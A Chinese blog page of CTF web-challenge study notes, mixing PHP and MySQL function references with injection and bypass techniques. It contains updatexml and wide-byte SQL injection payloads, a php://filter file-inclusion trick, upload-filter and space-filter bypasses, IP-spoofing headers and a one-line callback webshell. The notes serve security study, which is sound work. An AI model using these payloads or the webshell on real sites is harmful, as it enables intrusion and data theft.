@@ -1,0 +1,955 @@
+<!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>CTF 笔记 | 柠檬茶的博客</title>
+  <meta name="author" content="John Doe">
+
+  
+  <meta name="description" content="WEB 题 笔记
+
+PHP chr() 函数chr() 函数从指定 ASCII 值返回字符。
+
+
+
+
+base64_decode函数base64_decode — 对使用 MIME base64 编码的数据进行解码对 base64 编码的 data 进行解码。
+
+
+
+
+base64_encode加密">
+  
+
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="CTF 笔记">
+  <meta property="og:site_name" content="柠檬茶的博客">
+
+  
+  
+
+  
+    <meta property="og:image" content="/img/11.jpg">
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon">
+  
+
+  <link rel="alternate" href="/atom.xml" title="柠檬茶的博客" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+
+  <!-- baidu webmaster push -->
+  <script src="//push.zhanzhang.baidu.com/push.js"></script>
+
+</head>
+</html>
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">柠檬茶的博客</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-11-27T01:00:51.000Z"><a href="/2018/11/27/CTF-笔记/">2018-11-27</a></time>
+      
+      
+  
+    <h1 class="title">CTF 笔记</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="WEB-题-笔记"><a href="#WEB-题-笔记" class="headerlink" title="WEB 题 笔记"></a>WEB 题 笔记</h1><blockquote>
+<ul>
+<li>PHP chr() 函数<br>chr() 函数从指定 ASCII 值返回字符。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>base64_decode函数<br>base64_decode — 对使用 MIME base64 编码的数据进行解码<br>对 base64 编码的 data 进行解码。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>base64_encode加密函数</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>如果是walf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml       ———-  Content-Type: MUltipart/form-data 进行大小写绕过….</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li><p>eregi有%00截断的漏洞</p>
+</li>
+<li><p>PHP ord() 函数<br>ord() 函数返回字符串的首个字符的 ASCII 值。</p>
+</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP eval() 函数<br>eval() 函数把字符串按照 PHP 代码来计算。<br>该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br>如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP文件备份名后缀pak</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>SQL regexp 正则表达式</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>UpdateXml() MYSQL显错注入<br>在学习之前,需要先了解 UpdateXml() 。<br>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错:<pre><code>username=&#39; or updatexml/*&amp;password=1*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x7e),1) or &#39; 
+username=&#39; or updatexml/*&amp;password=1*/(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema regexp database() and table_name regexp 0x66666c6c34346a6a),0x7e),1) or &#39; 
+username=&#39; or updatexml/*&amp;password=1*/(1,concat(0x7e,(select value from ffll44jj),0x7e),1) or &#39; 
+</code></pre></li>
+<li>PHP implode() 函数<br>implode() 函数返回一个由数组元素组合成的字符串。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP mysqli_num_rows() 函数<br>返回结果集中行的数量：</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP openssl_decrypt<br>openssl_decrypt - 解密数据<br>采用raw或base64编码的字符串，并使用给定的方法和密钥对其进行解密。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP之filter协议<br>php:// — 访问各个输入/输出流（I/O streams）<br>php://input 是个可以访问请求的原始数据的只读流。<br>php://filter 是一种设计用来允许过滤器程序在打开时成为流的封装协议。这对于单独具有完整功能的文件函数非常有用，否则就没有机会在读取内容之前将过滤器应用于流之上。<br>该协议语法为：php://filter:/<action>=<name></name></action></li>
+</ul>
+</blockquote>
+<blockquote>
+<p>例题：南邮ctf 文件包含<a href="http://4.chinalover.sinaapp.com/web7/index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web7/index.php</a><br>点击题目所给链接url：<a href="http://4.chinalover.sinaapp.com/web7/index.php?file=show.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web7/index.php?file=show.php</a><br>为典型的文件包含漏洞。我们可以通过构造含有漏洞的语句，查看想要看的代码： file=php://filter/convert.base64-encode/resource=index.php 。再将得到的base64码解码即可。</p>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP intval() 函数<br>intval() 函数用于获取变量的整数值。<br>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP 函数 ereg()<br>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。ereg会把null视为字符串的结束，从而被%00截断</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP strpos() 函数<br>strpos() 函数查找字符串在另一字符串中第一次出现的位置。strpos则可以越过%00</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>sql: GROUP BY key2 WITH ROLLUP  查不到返回NULL</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>%df’宽字节注入 id=1%df’<br>宽字符:<br>（1）%27 ‘<br>（2）%20 空格<br>（3）%23 #<br>（4）%df 運（说明,也可以是其他的%d1之类，解析之后变成中文字符）<br>这个PHP程序的SQL注入POC为：<br><a href="http://127.0.0.1/test/t3.php?name=a%df&#39;" target="_blank" rel="noopener">http://127.0.0.1/test/t3.php?name=a%df&#39;</a> or 1=1; %20%23<br>其原理是mysql_query(“SETNAMES ‘gbk’”,$conn)语句将编码字符集修改为gbk，此时，%df\’对应的编码就是%df%5c’，即汉字“運’”，这样单引号之前的转义符号“\”就被吃调了，从而转义消毒失败。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>SQL ORDER BY 子句<br>ORDER BY 语句用于根据指定的列对结果集进行排序。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>DATABASE() 返回当前数据库名</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>获取数据库表名，id=1%df’ and 1=2 union select 1,group_concat(table_name) from information_schema.TABLES where table_schema=database() %23</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>concat()函数<br>将多个字符串连接成一个字符串。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>PHP move_uploaded_file() 函数<br>move_uploaded_file() 函数将上传的文件移动到新位置。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>escapeshellarg() — 把字符串转码为可以在 shell 命令里使用的参数<br>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>MySQL information_schema<pre><code>nformation_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。感觉information_schema就像是MySQL实例的一个百科全书，记录了数据库当中大部分我们需要了结的信息，比如字符集，权限相关，数据库实体对象信息，外检约束，分区，压缩表，表信息，索引信息，参数，优化，锁和事物等等。通过information_schema我们可以窥透整个MySQL实例的运行情况，可以了结MySQL实例的基本信息，甚至优化调优，维护数据库等，可以说是真正的一部百科全书啊哈哈。
+下面就是根据自己学习的一些小小经验将这些表进行一个大体的分类，方便大家了结，要是有不足的地方请指出，我会尽快修改。
+1：关于字符集和排序规则相关的系统表
+CHARACTER_SETS ：存储数据库相关字符集信息（memory存储引擎）
+COLLATIONS ：字符集对应的排序规则
+COLLATION_CHARACTER_SET_APPLICABILITY：就是一个字符集和连线校对的一个对应关系而已
+下面我们说一下character sets和collations的区别：
+字符集（character sets）存储字符串，是指人类语言中最小的表义符号。例如’A&#39;、’B&#39;等；
+排序规则（collations）规则比较字符串，collations是指在同一字符集内字符之间的比较规则
+每个字符序唯一对应一种字符集，但一个字符集可以对应多种字符序，其中有一个是默认字符序(Default Collation)
+MySQL中的字符序名称遵从命名惯例：以字符序对应的字符集名称开头；以_ci(表示大小写不敏感)、_cs(表示大小写敏感)或_bin(表示按编码值比较)结尾。例如：在字符序“utf8_general_ci”下，字符“a”和“A”是等价的
+看一下有关于字符集和校对相关的MySQL变量：
+character_set_server：默认的内部操作字符集
+character_set_client：客户端来源数据使用的字符集
+character_set_connection：连接层字符集
+character_set_results：查询结果字符集
+character_set_database：当前选中数据库的默认字符集
+character_set_system：系统元数据(字段名等)字符集
+再看一下MySQL中的字符集转换过程：
+（1）. MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；
+（2）. 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：
+使用每个数据字段的CHARACTER SET设定值；
+若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；
+若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；
+若上述值不存在，则使用character_set_server设定值。
+（3）. 将操作结果从内部操作字符集转换为character_set_results。
+2：权限相关的一些表：
+SCHEMA_PRIVILEGES：提供了数据库的相关权限，这个表是内存表是从mysql.db中拉去出来的。
+TABLE_PRIVILEGES:提供的是表权限相关信息，信息是从 mysql.tables_priv 表中加载的
+COLUMN_PRIVILEGES ：这个表可以清楚就能看到表授权的用户的对象，那张表那个库以及授予的是什么权限，如果授权的时候加上with grant option的话，我们可以看得到PRIVILEGE_TYPE这个值必须是YES。
+USER_PRIVILEGES:提供的是表权限相关信息，信息是从 mysql.user 表中加载的
+通过表我们可以很清晰看得到MySQL授权的层次，SCHEMA，TABLE，COLUMN级别，当然这些都是基于用户来授予的。可以看得到MySQL的授权也是相当的细密的，可以具体到列，这在某一些应用场景下还是很有用的，比如审计等。
+3：存储数据库系统的实体对象的一些表：
+COLUMNS：存储表的字段信息，所有的存储引擎
+INNODB_SYS_COLUMNS ：存放的是INNODB的元数据， 他是依赖于SYS_COLUMNS这个统计表而存在的。
+ENGINES ：引擎类型，是否支持这个引擎，描述，是否支持事物，是否支持分布式事务，是否能够支持事物的回滚点
+EVENTS ：记录MySQL中的事件，类似于定时作业
+FILES ：这张表提供了有关在MySQL的表空间中的数据存储的文件的信息，文件存储的位置，这个表的数据是从InnoDB in-memory中拉取出来的，所以说这张表本身也是一个内存表，每次重启重新进行拉取。也就是我们下面要说的INNODB_SYS_DATAFILES这张表。还要注意一点的是这张表包含有临时表的信息，所以说和SYS_DATAFILES 这张表是不能够对等的，还是要从INNODB_SYS_DATAFILES看。如果undo表空间也配置是InnoDB 的话，那么也是会被记录下来的。
+PARAMETERS ：参数表存储了一些存储过程和方法的参数，以及存储过程的返回值信息。存储和方法在ROUTINES里面存储。
+PLUGINS ：基本上是MySQL的插件信息，是否是活动状态等信息。其实SHOW PLUGINS本身就是通过这张表来拉取道德数据
+ROUTINES：关于存储过程和方法function的一些信息，不过这个信息是不包括用户自定义的，只是系统的一些信息。
+SCHEMATA：这个表提供了实例下有多少个数据库，而且还有数据库默认的字符集
+TRIGGERS :这个表记录的就是触发器的信息，包括所有的相关的信息。系统的和自己用户创建的触发器。
+VIEWS :视图的信息，也是系统的和用户的基本视图信息。
+这些表存储的都是一些数据库的实体对象，方便我们进行查询和管理，对于一个DBA来说，这些表能够大大方便我们的工作，更快更方便的了结和查询数据库的相关信息。
+4：约束外键等相关的一些表：
+REFERENTIAL_CONSTRAINTS：这个表提供的外键相关的信息，而且只提供外键相关信息
+TABLE_CONSTRAINTS ：这个表提供的是 相关的约束信息
+INNODB_SYS_FOREIGN_COLS ：这个表也是存储的INNODB关于外键的元数据信息和SYS_FOREIGN_COLS 存储的信息是一致的
+INNODB_SYS_FOREIGN ：存储的INNODB关于外键的元数据信息和SYS_FOREIGN_COLS 存储的信息是一致的，只不过是单独对于INNODB来说的
+KEY_COLUMN_USAGE：数据库中所有有约束的列都会存下下来，也会记录下约束的名字和类别
+为什么要把外键和约束单列出来呢，因为感觉这是一块独立的东西，虽然我们的生产环境大部分都不会使用外键，因为这会降低性能，但是合理的利用约束还是一个不错的选择，比如唯一约束。
+5：关于管理的一些的一些表：
+GLOBAL_STATUS ，GLOBAL_VARIABLES，SESSION_STATUS，SESSION_VARIABLES：这四张表分别记录了系统的变量，状态（全局和会话的信息），作为DBA相信大家也都比较熟悉了，而且这几张表也是在系统重启的时候回重新加载的。也就是内存表。
+PARTITIONS ：MySQL分区表相关的信息，通过这张表我们可以查询到分区的相关信息（数据库中已分区的表，以及分区表的分区和每个分区的数据信息），分区相关详细信息参见MySQL分区管理
+PROCESSLIST：show processlist其实就是从这个表拉取数据，PROCESSLIST的数据是他的基础。由于是一个内存表，所以我们相当于在内存中查询一样，这些操作都是很快的。
+INNODB_CMP_PER_INDEX，INNODB_CMP_PER_INDEX_RESET：这两个表存储的是关于压缩INNODB信息表的时候的相关信息,有关整个表和索引信息都有.我们知道对于一个INNODB压缩表来说,不管是数据还是二级索引都是会被压缩的,因为数据本身也可以看作是一个聚集索引。关于压缩表在information_schema系列十一有些许简单的介绍。
+INNODB_CMPMEM ，INNODB_CMPMEM_RESET：这两个表是存放关于MySQL INNODB的压缩页的buffer pool信息，但是要注意一点的就是,用这两个表来收集所有信息的表的时候,是会对性能造成严重的影响的,所以说默认是关闭状态的。如果要打开这个功能的话我们要设置innodb_cmp_per_index_enabled参数为ON状态。
+INNODB_BUFFER_POOL_STATS ：表提供有关INNODB 的buffer pool相关信息，和show engine innodb status提供的信息是相同的。也是show engine innodb status的信息来源。
+INNODB_BUFFER_PAGE_LRU，INNODB_BUFFER_PAGE :维护了INNODB LRU LIST的相关信息，详细请见小编笔记innodb buffer pool小解
+INNODB_BUFFER_PAGE ：这个表就比较屌了，存的是buffer里面缓冲的页数据。查询这个表会对性能产生很严重的影响，千万不要再我们自己的生产库上面执行这个语句，除非你能接受服务短暂的停顿，详细请见小编笔记innodb buffer pool小解
+INNODB_SYS_DATAFILES ：这张表就是记录的表的文件存储的位置和表空间的一个对应关系(INNODB)
+INNODB_TEMP_TABLE_INFO ：这个表惠记录所有的INNODB的所有用户使用到的信息，但是只能记录在内存中和没有持久化的信息。
+INNODB_METRICS ：提供INNODB的各种的性能指数，是对INFORMATION_SCHEMA的补充，收集的是MySQL的系统统计信息。这些统计信息都是可以手动配置打开还是关闭的。有以下参数都是可以控制的：innodb_monitor_enable, innodb_monitor_disable, innodb_monitor_reset, innodb_monitor_reset_all。
+INNODB_SYS_VIRTUAL :表存储的是INNODB表的虚拟列的信息，当然这个还是比较简单的，在MySQL 5.7中，支持两种Generated Column，即Virtual Generated Column和Stored Generated Column，前者只将Generated Column保存在数据字典中（表的元数据），并不会将这一列数据持久化到磁盘上；后者会将Generated Column持久化到磁盘上，而不是每次读取的时候计算所得。很明显，后者存放了可以通过已有数据计算而得的数据，需要更多的磁盘空间，与实际存储一列数据相比并没有优势，因此，MySQL 5.7中，不指定Generated Column的类型，默认是Virtual Column。
+INNODB_CMP，INNODB_CMP_RESET：存储的是关于压缩INNODB信息表的时候的相关信息，详细请见推荐笔记。
+为什么把这些表列为管理相关的表呢，因为我感觉像连接，分区，压缩表，innodb buffer pool等表，我们通过这些表都能很清晰的看到自己数据库的相关功能的状态，特别是我们通过一些变量更容易窥透MySQL的运行状态，方便我们进行管理。相关笔记有推荐innodb buffer pool小解，MySQL分区管理，information_schema系列十一。都是小编自己的笔记。
+6：关于表信息和索引信息的一些表
+TABLES，TABLESPACES，INNODB_SYS_TABLES ，INNODB_SYS_TABLESPACES ：
+TABLES这张表毫无疑问了，就是记录的数据库中表的信息，其中包括系统数据库和用户创建的数据库。show table status like &#39;test1&#39;\G的来源就是这个表；
+TABLESPACES 却是标注的活跃表空间。 这个表是不提供关于innodb的表空间信息的，对于我们来说并没有太大作用，因为我们生产库是强制INNODB的；
+INNODB_SYS_TABLES 这张表依赖的是SYS_TABLES数据字典中拉取出来的。此表提供了有关表格的格式和存储特性，包括行格式，压缩页面大小位级别的信息（如适用）
+提供的是关于INNODB的表空间信息，其实和SYS_TABLESPACES 中的INNODB信息是一致的。
+STATISTICS：这个表提供的是关于表的索引信息，所有索引的相关信息。
+INNODB_SYS_INDEXES：提供相关INNODB表的索引的相关信息，和SYS_INDEXES 这个表存储的信息基本是一样的，只不过后者提供的是所有存储引擎的索引信息，后者只提供INNODB表的索引信息。
+INNODB_SYS_TABLESTATS：
+这个表就比较重要了，记录的是MySQL的INNODB表信息以及MySQL优化器会预估SQL选择合适的索引信息，其实就是MySQL数据库的统计信息
+这个表的记录是记录在内存当中的，是一个内存表，每次重启后就会重新记录，所以只能记录从上次重启后的数据库统计信息。有了这个表，我们对于索引的维护就更加方便了，我们可以查询索引的使用次数，方便清理删除不常用的索引，提高表的更新插入等效率，节省磁盘空间。
+INNODB_SYS_FIELDS ：这个表记录的是INNODB的表索引字段信息，以及字段的排名
+INNODB_FT_CONFIG :这张表存的是全文索引的信息
+INNODB_FT_DEFAULT_STOPWORD：这个表存放的是stopword 的信息,是和全文索引匹配起来使用的，和innodb的 INFORMATION_SCHEMA.INNODB_FT_DEFAULT_STOPWORD 是相同的，这个STOPWORD必须是在创建索引之前创建，而且必须指定字段为varchar。stopword 也就是我们所说的停止词，全文检索时，停止词列表将会被读取和检索，在不同的字符集和排序方式下，会造成命中失败或者找不到此数据，这取决于停止词的不同的排序方式。我们可以使用这个功能筛选不必要字段。
+INNODB_FT_INDEX_TABLE：这个表存储的是关于INNODB表有全文索引的索引使用信息的，同样这个表也是要设置innodb_ft_aux_table以后才能够使用的，一般情况下是空的
+INNODB_FT_INDEX_CACHE ：这张表存放的是插入前的记录信息，也是为了避免DML时候昂贵的索引重组
+7：关于MySQL优化相关的一些表
+OPTIMIZER_TRACE ：提供的是优化跟踪功能产生的信息.关于这个我也谢了做了一个小测试，MySQL追踪优化器小试
+PROFILING：SHOW PROFILE可以深入的查看服务器执行语句的工作情况。以及也能帮助你理解执行语句消耗时间的情况。一些限制是它没有实现的功能，不能查看和剖析其他连接的语句，以及剖析时所引起的消耗。
+SHOW PROFILES显示最近发给服务器的多条语句，条数根据会话变量profiling_history_size定义，默认是15，最大值为100。设为0等价于关闭分析功能。详细信息请见MySQL profile
+INNODB_FT_BEING_DELETED,INNODB_FT_DELETED: INNODB_FT_BEING_DELETED 这张表是INNODB_FT_DELETED的一个快照,只在OPTIMIZE TABLE 的时候才会使用。详细信息详见我的OPTIMIZE TABLE 小解
+8：关于MySQL事物和锁的相关的一些表
+INNODB_LOCKS:现在获取的锁，但是不含没有获取的锁，而且只是针对INNODB的。
+INNODB_LOCK_WAITS：系统锁等待相关信息，包含了阻塞的一行或者多行的记录，而且还有锁请求和被阻塞改请求的锁信息等。
+INNODB_TRX：包含了所有正在执行的的事物相关信息（INNODB），而且包含了事物是否被阻塞或者请求锁。
+我们通过这些表就能够很方便的查询出来未结束的事物和被阻塞的进程，这是不是更方便了，详细可见information_schema系列八(事物，锁)
+</code></pre></li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>获取数据库表列名，id=1%df’ and 1=2 union select 1,group_concat(column_name) from information_schema.COLUMNS where table_name=ctf4 %23<br><code>`</code><br>1、informaiton_schema.columns 常用列：</li>
+</ul>
+</blockquote>
+<p>　　1、table_catalog　　　　　　　　　　：不管是table | view 这个列的值总是def</p>
+<p>　　2、table_schema　　　　　　　　　  ：表 | 视图所在的数据库名</p>
+<p>　　3、table_name　　　　　　　　　　  ：表名 | 视图名</p>
+<p>　　4、column_name　　　　　　　　　  ：列名</p>
+<p>　　5、column_default　　　　　　　　   ：列的默认值</p>
+<p>　　6、is_nullable　　　　　　　　　　　  ：是否可以取空值</p>
+<p>　　7、data_type　　　　　　　　　　　  ：列的数据类型</p>
+<p>　　8、character_maximum_length　　  ：列的最大长度（这列只有在数据类型为char | varchar 时才有意义）</p>
+<p>　　9、column_type　　　　　　　　　　 ：列类型这个类型比data_type列所指定的更加详细，如data_type 是int 而column_type 就有可以能是int(11)</p>
+<p>　　10、column_key　　　　　　　　　　 ：列上的索引类型 主键–&gt;PRI  | 唯一索引 –&gt;UNI  一般索引 –&gt;MUL</p>
+<pre><code>
+
+
+&gt; * MySQL执行查询时会跳过畸形字符
+&gt; http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2  
+&gt; 和
+http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6%27--+ 
+返回结果相同。
+由于MySQL执行查询时会跳过畸形字符，而 id=2%d6%27--+  经过转义变为id=2%d6%5c%27--+ ，
+其中%d6%5c被合在一起解释，也就是id = &#39;2Ö&#39;-- 效果等价于 id = &#39;2&#39;--，但我们获得了执行sql的机会。
+
+
+&gt; * md5()函数要求接收一个字符串，若传递进去一个数组，则会返回null
+
+&gt; * PHP isset() 函数
+&gt; 检测变量是否设置，并且不是 NULL。
+如果已经使用 unset() 释放了一个变量之后，它将不再是 isset()。若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。同时要注意的是一个 NULL 字节（&quot;\0&quot;）并不等同于 PHP 的 NULL 常数。
+
+&gt; * php $_SERVER[&#39;REQUEST_METHOD&#39;]判断表单是post还是get提交
+
+&gt; * PHP extract() 函数
+&gt; extract() 函数从数组中将变量导入到当前的符号表。
+该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。
+该函数返回成功设置的变量数目。
+*若没有另外指定，函数将覆盖已有变量
+
+
+&gt; * X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。标准格式如下:X-Forwarded-For: client1, proxy1, proxy2。
+
+
+&gt; * PHP trim() 函数
+&gt; trim($str,&quot;Hed!&quot;); 移除字符串两侧的字符（ Hello World! &quot;Hello&quot; 中的 &quot;He&quot; 以及 &quot;World&quot; 中的 &quot;d!&quot;）：
+&gt; trim() 函数移除字符串两侧的空白字符或其他预定义字符。
+
+
+&gt; * strcmp函数在比较失败，即传入数组，时会返回null。
+
+
+&gt; * get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置
+&gt; 如果 magic_quotes_gpc 为关闭时返回 0，否则返回 1。在 PHP 5.4.O 起将始终返回 FALSE
+&gt; 当 magic_quotes_gpc 打开时，所有的 ‘ (单引号), ” (双引号), (反斜线) and 空字符会自动转为含有反斜线的溢出字符。
+
+
+
+&gt; *  PHP stripslashes() 函数
+&gt; 删除反斜杠
+&gt; addslashes() 函数添加的反斜杠。
+
+&gt; * md5(&quot;ffifdyop&quot;)  出现 &quot;&quot;
+
+&gt; * unserialize() 反序列化字符串。  PHP
+&gt; * serialize()  序列化字符串     PHP
+&gt; 序列化后：O:8:”just4fun”:2:{s:6:”secret”;N;s:5:”enter”;R:2;}
+just4fun Object ( [secret] =&gt; [enter] =&gt; )
+
+
+&gt; * php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号__开头的，比如__construct, __destruct, __toString, __sleep, __wakeup等等。这些函数在某些情况下会自动调用，比如__construct当一个对象创建时被调用，__destruct当一个对象销毁时被调用，__toString当一个对象被当作一个字符串使用。在下列代码中增加了三个magic方法，__construct, __destruct和__toString。可以看出，__construct在对象创建时调用，__destruct在php脚本结束时调用，__toString在对象被当作一个字符串使用时调用。
+
+
+
+&gt; * PHP htmlentities() 函数
+&gt; 把字符转换为 HTML 实体
+&gt; 选值为ENT_QUOTES时 会转义一些字符   &#39;  =&gt;   \&#39;
+
+&gt; * PHP ceil() 函数
+&gt; ceil() 函数向上舍入为最接近的整数。
+
+&gt; * PHP mysql_num_rows() 函数
+&gt; mysql_num_rows() 函数返回结果集中行的数目。
+
+
+&gt; * Bash shell在“~/.bash_history”（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。
+&gt; http://(host)/.bash_history  查看
+
+
+&gt; * PHP strcasecmp() 函数
+&gt; 比较两个字符串（不区分大小写
+
+&gt; * PHP mysql_fetch_array() 函数
+&gt; mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有
+返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。
+
+
+
+&gt; * var_dump(!strcasecmp(array(), $query[pw]));//bool(true)
+&gt; var_dump(!strcasecmp(md5(array()), $query[pw]));//bool(false)
+
+
+&gt; * SQL MID() 函数
+&gt; MID 函数用于从文本字段中提取字符。
+&gt; 参数                   描述
+column_name    必需。要提取字符的字段。
+start    必需。规定开始位置（起始值是 1）。
+length    可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。
+
+&gt; * PHP addslashes() 函数
+&gt; addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。
+
+&gt; * 尝试各种伪造IP的HTTP头
+&gt; X-Forwarded-For
+Client-IP
+x-remote-IP
+x-originating-IP
+x-remote-addr
+
+
+&gt; * %00 能绕过is_numeric()
+&gt;
+&gt; * SQL的IF语句
+&gt; IF(expr1,expr2,expr3)
+&gt; 如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。
+
+&gt; * PHP is_numeric() 函数
+&gt; is_numeric() 函数用于检测变量是否为数字或数字字符串。
+
+&gt; * PHP mysql_real_escape_string() 函数
+&gt; mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。
+&gt; 如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。
+&gt; **参数    描述**
+string    必需。规定要转义的字符串。
+connection    可选。规定 MySQL 连接。如果未规定，则使用上一个连接。
+
+&gt; * 绕空格的一些常见方法如下：
+&gt; %20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/
+
+&gt; * PHP str_split() 函数
+&gt; str_split() 函数把字符串分割到数组中。
+&gt; **参数    描述**
+string    必需。规定要分割的字符串。
+length    可选。规定每个数组元素的长度。默认是 1。
+
+&gt; * PHP count() 函数
+&gt; count() 函数返回数组中元素的数目。
+
+
+&gt; * PHP file_get_contents() 函数 
+&gt; file_get_contents() 函数把整个文件读入一个字符串中。
+和 file() 一样，不同的是 file_get_contents() 把文件读入一个字符串。
+file_get_contents() 函数是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。
+
+
+
+&gt; * SQL exists()
+&gt; EXISTS用于检查子查询是否至少会返回一行数据，该子查询实际上并不返回任何数据，而是返回值True或False
+EXISTS 指定一个子查询，检测 行 的存在。
+
+
+&gt; * SQL count() 检查数量
+
+
+&gt; * SQL ORD()函数
+&gt; 如果最左边的字符不是一个多字节字符，ORD()返回相同的值如ASCII()函数。
+
+
+&gt; * SQL SUBSTRING 函数 
+&gt;  SQL 中的 substring 函数是用来抓出一个栏位资料中的其中一部分。
+
+
+
+&gt; * SQL ascii()
+&gt; 字符转ascii值
+
+
+
+&gt; * $_REQUEST — HTTP Request 变量
+默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。
+
+
+
+&gt; * PHP array_walk() 函数
+&gt; array_walk() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。
+
+
+
+&gt; * PHP preg_replace() 函数
+&gt; preg_replace 函数执行一个正则表达式的搜索和替换。
+
+
+&gt; * 回调函数木马
+&gt; &lt;?php $e = $_REQUEST[&#39;www&#39;]; $arr = array($_POST[&#39;wtf&#39;] =&gt; &#39;|.*|e&#39;,); array_walk($arr, $e, &#39;&#39;); ?&gt;
+
+
+&gt; * scandir()函数
+&gt; scandir() 函数返回指定目录中的文件和目录的数组。
+&gt; scandir(directory,sorting_order,context);　
+&gt; 使用opendir、readdir、closedir
